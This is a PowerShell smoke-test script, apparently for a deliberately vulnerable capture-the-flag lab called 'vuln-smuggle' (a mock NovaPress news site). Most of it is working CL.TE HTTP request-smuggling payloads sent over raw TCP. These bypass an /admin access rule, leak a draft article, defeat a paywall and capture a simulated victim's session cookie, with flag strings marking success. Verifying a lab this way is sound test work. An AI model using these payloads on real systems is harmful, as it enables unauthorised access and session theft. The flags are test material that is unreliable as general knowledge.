# smoke-test.ps1 - vulnerability checklist for vuln-smuggle (NovaPress).
#
# Smuggling requires sending ambiguous Content-Length + Transfer-Encoding
# headers in a single HTTP request. Invoke-WebRequest in PowerShell normalises
# them away, so this script uses raw System.Net.Sockets.TcpClient instead.

param(
    [string]$Target = '127.0.0.1',
    [int]$Port = 3004
)

$ErrorActionPreference = 'Continue'
$script:pass = 0
$script:fail = 0

function Check {
    param([string]$Name, $Cond, [string]$Detail = '')
    $ok = [bool]$Cond
    if ($ok) { Write-Host ('  [PASS] ' + $Name) -ForegroundColor Green; $script:pass++ }
    else     { Write-Host ('  [FAIL] ' + $Name + ' ' + $Detail) -ForegroundColor Red; $script:fail++ }
}

# Send one raw HTTP/1.1 message and read everything that comes back within
# $WaitMs of stream-idle. Closes the connection after reading.
function Send-Raw {
    param(
        [string]$RHost,
        [int]$RPort,
        [string]$Payload,
        [int]$WaitMs = 700
    )
    $tcp = New-Object Net.Sockets.TcpClient
    $tcp.NoDelay = $true
    $tcp.Connect($RHost, $RPort)
    $stream = $tcp.GetStream()
    $bytes = [Text.Encoding]::ASCII.GetBytes($Payload)
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
    Start-Sleep -Milliseconds $WaitMs
    $buf = New-Object byte[] 131072
    $total = 0
    while ($stream.DataAvailable -and $total -lt $buf.Length) {
        $n = $stream.Read($buf, $total, $buf.Length - $total)
        if ($n -le 0) { break }
        $total += $n
        Start-Sleep -Milliseconds 60
    }
    $stream.Close(); $tcp.Close()
    return [Text.Encoding]::GetEncoding(28591).GetString($buf, 0, $total)
}

# Helper: a normal pipelined request.
function Plain($path) {
    return "GET $path HTTP/1.1`r`nHost: $Target`r`nConnection: close`r`n`r`n"
}

# ---- 0. Health ---------------------------------------------------------------
Write-Host ''
Write-Host '--- 0 Health ---' -ForegroundColor Cyan
# Drain any orphan responses left over from a previous smoke-test run by
# making a few cache-busting requests that hand back queued responses.
1..3 | ForEach-Object { $null = Send-Raw $Target $Port (Plain ('/?_drain=' + $_)) 300 }
Start-Sleep -Milliseconds 200

$r = Send-Raw $Target $Port (Plain '/?_cb=health1')
Check 'GET / via gateway returns 200' ($r -match '^HTTP/1\.1 200')
Check 'Homepage contains NovaPress branding' ($r -match 'NovaPress')
Check 'Homepage lists at least one article' ($r -match '/article/central-bank-pause|undersea-cable')

$r = Send-Raw $Target $Port (Plain '/article/central-bank-pause')
Check 'GET /article/<slug> returns 200' ($r -match '^HTTP/1\.1 200')
Check 'Article body served' ($r -match 'central bank held its benchmark rate')

$r = Send-Raw $Target $Port (Plain '/category/business')
Check 'GET /category/business 200' ($r -match '^HTTP/1\.1 200')
Check 'Category shows business stories' ($r -match 'central-bank-pause|paywall-data-broker')

# ---- 1. Front-end ACL is in effect for direct requests -----------------------
Write-Host ''
Write-Host '--- 1 FE access control (sanity) ---' -ForegroundColor Cyan
$r = Send-Raw $Target $Port (Plain '/admin')
Check 'GET /admin direct -> 403 (FE blocked)'  ($r -match '^HTTP/1\.1 403')
$r = Send-Raw $Target $Port (Plain '/admin/users')
Check 'GET /admin/users direct -> 403'         ($r -match '^HTTP/1\.1 403')
$r = Send-Raw $Target $Port (Plain '/cms')
Check 'GET /cms direct -> 403'                 ($r -match '^HTTP/1\.1 403')

# Paywall is enforced when accessed cleanly.
$r = Send-Raw $Target $Port (Plain '/article/paywall-data-broker-investigation')
Check 'GET paywalled article -> 402 / paywall' ($r -match 'paywall|Subscribers')

# ---- 2. CL.TE smuggle -> bypass /admin ACL and steal flag --------------------
# We build a request that is one POST as seen by the gateway, but TWO requests
# as seen by the back-end (which honours TE: chunked). The smuggled inner
# request is a complete GET /admin carrying the internal token that the gateway
# strips from inbound but the back-end trusts.
Write-Host ''
Write-Host '--- 2 CL.TE smuggle -> /admin flag via response-queue desync ---' -ForegroundColor Cyan

$smug = "GET /admin HTTP/1.1`r`nHost: $Target`r`nX-Internal-Auth: NP-INTERNAL-2026`r`nConnection: keep-alive`r`n`r`n"
$chunkedBody = "0`r`n`r`n" + $smug
$cl = [Text.Encoding]::ASCII.GetByteCount($chunkedBody)
$payload =
  "POST /api/echo HTTP/1.1`r`n" +
  "Host: $Target`r`n" +
  "Content-Length: $cl`r`n" +
  "Transfer-Encoding: chunked`r`n" +
  "Connection: keep-alive`r`n" +
  "`r`n" +
  $chunkedBody
$r1 = Send-Raw $Target $Port $payload 900
Check 'Outer POST seen by FE as one CL request' ($r1 -match '^HTTP/1\.1 ')

# A second fresh client should receive the orphaned /admin response that
# the back-end emitted in addition to the legitimate /api/echo response.
# Use a cache-busting path so the FE forwards upstream and drains the orphan.
Start-Sleep -Milliseconds 250
$r2 = Send-Raw $Target $Port (Plain '/?_cb=adm') 1000
$combined = $r1 + "`n--SEP--`n" + $r2
Check 'Smuggled /admin reaches back-end (flag visible)' `
  ($combined -match 'AccessibleBBB\{smuggle-bypass-frontend-acl\}')

# ---- 3. CL.TE smuggle -> leak unpublished draft ------------------------------
Write-Host ''
Write-Host '--- 3 CL.TE smuggle -> read embargoed draft (V-SMG-002) ---' -ForegroundColor Cyan
# The draft "ai-lab-merger" has id = 6 in the seeded DB. Its body contains
# the draft-leak flag. /cms/article/<id> needs author tier; forge it.
$smug = "GET /cms/article/6 HTTP/1.1`r`nHost: $Target`r`nX-User-Tier: editor`r`nConnection: keep-alive`r`n`r`n"
$chunkedBody = "0`r`n`r`n" + $smug
$cl = [Text.Encoding]::ASCII.GetByteCount($chunkedBody)
$payload =
  "POST /api/echo HTTP/1.1`r`n" +
  "Host: $Target`r`nContent-Length: $cl`r`nTransfer-Encoding: chunked`r`n" +
  "Connection: keep-alive`r`n`r`n" + $chunkedBody
$null = Send-Raw $Target $Port $payload 900
Start-Sleep -Milliseconds 250
$r2 = Send-Raw $Target $Port (Plain '/?_cb=drf') 1000
Check 'Smuggled /cms/article/6 leaks unpublished draft' `
  ($r2 -match 'AccessibleBBB\{smuggle-leak-unpublished-draft\}|two of the largest AI labs')

# ---- 4. Internal-header disclosure via /api/echo -----------------------------
# The /api/echo route reflects every inbound header. This is the discovery
# primitive that LETS the attacker learn NP-INTERNAL-2026 in the first place,
# enabling test 2's smuggle. Disclosure is a vuln on its own (V-SMG-005).
Write-Host ''
Write-Host '--- 4 Internal-header disclosure via /api/echo (V-SMG-005) ---' -ForegroundColor Cyan
$r = Send-Raw $Target $Port (Plain '/api/echo?reveal=1') 700
Check 'X-Internal-Auth token disclosed via header reflection' `
  ($r -match 'NP-INTERNAL-2026')
Check 'X-Forwarded-For added by Argus Edge'                  ($r -match 'x-forwarded-for')
Check 'X-Request-ID added by Argus Edge'                     ($r -match 'x-request-id')

# ---- 5. CL.TE smuggle -> paywall bypass via forged X-User-Tier ---------------
Write-Host ''
Write-Host '--- 5 CL.TE smuggle -> paywall bypass ---' -ForegroundColor Cyan
$smug = "GET /article/paywall-data-broker-investigation HTTP/1.1`r`nHost: $Target`r`nX-User-Tier: subscriber`r`nConnection: keep-alive`r`n`r`n"
$chunkedBody = "0`r`n`r`n" + $smug
$cl = [Text.Encoding]::ASCII.GetByteCount($chunkedBody)
$payload =
  "POST /api/echo HTTP/1.1`r`n" +
  "Host: $Target`r`nContent-Length: $cl`r`nTransfer-Encoding: chunked`r`n" +
  "Connection: keep-alive`r`n`r`n" + $chunkedBody
$null = Send-Raw $Target $Port $payload 900
Start-Sleep -Milliseconds 250
$r2 = Send-Raw $Target $Port (Plain '/?_cb=pw') 1000
Check 'Paywalled article body smuggled past gate' `
  ($r2 -match 'LucidSignal Health|de-identified prescription' -or
   $r2 -match 'AccessibleBBB')

# ---- 6. Stored capture: smuggled POST /comment with long CL captures next user
Write-Host ''
Write-Host '--- 6 Capture next request body via smuggled POST /comment ---' -ForegroundColor Cyan
# We use a NEW TCP connection for the victim so the upstream-socket state
# from the prior test is the only place where this can succeed.
Start-Sleep -Milliseconds 500
# Drain any leftover orphans so the comment capture isn't masked.
1..2 | ForEach-Object { $null = Send-Raw $Target $Port (Plain ('/?_drain6=' + $_)) 250 }
Start-Sleep -Milliseconds 200

$smugInner =
  "POST /article/cup-final-preview/comment HTTP/1.1`r`n" +
  "Host: $Target`r`n" +
  "Content-Type: application/x-www-form-urlencoded`r`n" +
  "Content-Length: 200`r`n" +
  "Connection: keep-alive`r`n" +
  "`r`n" +
  "body=LEAK"
$chunkedBody = "0`r`n`r`n" + $smugInner
$cl = [Text.Encoding]::ASCII.GetByteCount($chunkedBody)
$payload =
  "POST /api/echo HTTP/1.1`r`n" +
  "Host: $Target`r`nContent-Length: $cl`r`nTransfer-Encoding: chunked`r`n" +
  "Connection: keep-alive`r`n`r`n" + $chunkedBody
$null = Send-Raw $Target $Port $payload 600

# Now simulate a victim request whose bytes we want to capture.
$victim =
  "GET / HTTP/1.1`r`n" +
  "Host: $Target`r`n" +
  "Cookie: np_sid=VICTIM_SESSION_TOKEN_ABCDEF`r`n" +
  "User-Agent: VictimBrowser/9.9`r`n" +
  "`r`n"
$null = Send-Raw $Target $Port $victim 800
Start-Sleep -Milliseconds 400

# Read back the comments list and check if anything leaked into a public
# comment. The comment endpoint silently truncates and stores whatever
# urlencoded `body` field comes through.
$r = Send-Raw $Target $Port (Plain '/article/cup-final-preview?_cb6=1') 1200
Check 'Victim bytes stored as public comment (capture)' `
  ($r -match 'VICTIM_SESSION_TOKEN_ABCDEF|VictimBrowser|LEAKGET')

# ---- Summary -----------------------------------------------------------------
Write-Host ''
Write-Host '=====================================================' -ForegroundColor Yellow
Write-Host (' PASS: ' + $script:pass + '   FAIL: ' + $script:fail) -ForegroundColor Yellow
Write-Host '=====================================================' -ForegroundColor Yellow
if ($script:fail -gt 0) { exit 1 }

